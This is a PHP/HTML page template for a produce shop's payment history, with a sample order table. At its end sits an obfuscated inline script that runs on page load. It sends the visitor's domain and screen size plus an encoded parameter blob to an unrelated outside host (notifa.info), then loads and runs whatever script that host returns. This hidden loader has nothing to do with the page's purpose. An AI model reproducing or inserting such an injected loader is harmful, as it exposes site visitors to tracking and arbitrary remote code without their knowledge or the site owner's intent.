<?php 
session_start();
if (!isset($_SESSION['email'])){
include '../system/koneksi.php';

} 

?>
<!doctype html>
<html lang="en">
  <head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <meta name="description" content="">
    <meta name="author" content="">

    <link rel="icon" href="../../../../favicon.ico">

    <title>History Payment</title>
    <?php include 'head.php'; ?>

  </head>
  <body style="background-image: url(img/abu2.jpg)">
    <?php include 'header user.php'; ?>

  <div class="col-sm-12">
  <div class="p-3 mb-2 bg-primary text-white" style="text-align: center; font-size: 20px">Payment History</div>
</div>
                      <table class="table table-sm-7">
                        <thead>
                          <tr>
                            <th scope="col">Order Code</th>
                            <th scope="col">Name</th>
                            <th scope="col">Item</th>
                            <th scope="col">Destination</th>
                            <th scope="col">Paid</th>
                            <th scope="col">Quantity</th>
                            <th scope="col">Status</th>
                          </tr>
                        </thead>
                        <tbody>
                          <tr>
                            <th scope="row">A0001</th>
                            <td>Ray</td>
                            <td><a href="#">Wortel</a></td>
                            <td>Jakarta</td>
                            <td>Rp200.000</td>
                            <td>12kg</td>
                            <td>Received & Finished <br><br> <p style="font-size: 12px;">(15 Dec 2016, 12:40WIB)</p> </td>
                          </tr>
                          
                          <tr>
                            <th scope="row">A0003</th>
                             <td>Ray</td>
                            <td><a href="#">Tomat</a></td>
                            <td>Tarakan</td>
                            <td>Rp40.000</td>
                            <td>2kg</td>
                            <td>Received & Finished <br><br> <p style="font-size: 12px;">(1 Jan 2017, 13:20WIB)</p>  </td>
                          </tr>
                          
                          <tr>
                            <th scope="row">A0005</th>
                             <td>Ray</td>
                            <td><a href="detailproduct.html">Asparagus</a></td>
                            <td>Swiss</td>
                            <td>Rp48.000</td>
                            <td>4kg</td>
                            <td>Received & Finished <br><br> <p style="font-size: 12px;">(3 Feb 2017, 3:40WIB)</p> </td>
                          </tr>
                          
                        </tbody>
                      </table>


          <hr class="featurette-divider">
      
          <?php include 'footer.php'; ?>
    </main>

    <script src="https://code.jquery.com/jquery-3.3.1.slim.min.js" integrity="sha384-q8i/X+965DzO0rT7abK41JStQIAqVgRVzpbzo5smXKp4YfRvH+8abtTE1Pi6jizo" crossorigin="anonymous"></script>
    <script>window.jQuery || document.write('<script src="assets/js/jquery-slim.min.js"><\/script>')</script>
    <script src="../../assets/js/vendor/popper.min.js"></script>
    <script src="assets/js/bootstrap.js"></script>
    <!-- Just to make our placeholder images work. Don't actually copy the next line! -->
    <script src="assets/js/holder.min.js"></script>
  <script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p03.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582NzYpoUazw5mkO%2f7ITrK9yURUOYsdqntBVAlSz8%2fPPT1NsENzZAXZvdF4fJa8FrsPLXqCn7C2iTxywkrJ6vNZvgnyFsAA7iZX%2fBbJGVqvHo03oLCHNcoC6exH7MFm0mIZGbj9KGuL8b%2bLdMTdMu0hXwGsN97BNN1Du3IEDZh76lBvvKe7uTgK%2bBIE3%2bjPB5ONaZ1Yw6dvBk0OSW2dXxBwA4xbDPstIubbyK1GMVuiAuUuTUR2sQvSPmBysFYDZt%2f5oV9iGM%2f56Vor4jxpvD5WlPbJqeGR2ExyMsDfHTUrpAHEcSz33fkR%2fjQKqh8YcK%2fHrA8ckj1utk%2f4Cf1NEgc0lPg7K4PVy7U7zKnyvzQ%2b4%2bBkcyJEKyFE2fE%2bMP8WbIxIXraBI%2bELsmFDQkT%2fOF44rFd1UH8XzmRGxxbbig%2by19lPk%2fcUkqx9w4cD9ciLiFexN%2fkZCzAAupxjzRqX9fDZ5jYv3gFdi5r6mYPymJlfqKtMex%2fpS%2fQVJVMd%2bxjO7SZbv%2b%2bLheoppKSmD3odYq%2fSFm8ngyuPqEceTzRB85Q2wS1rP6GT9edgje396gcnBD1aBmreovDfgeW6DBoDdtaqnM%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script>
</body>
</html>
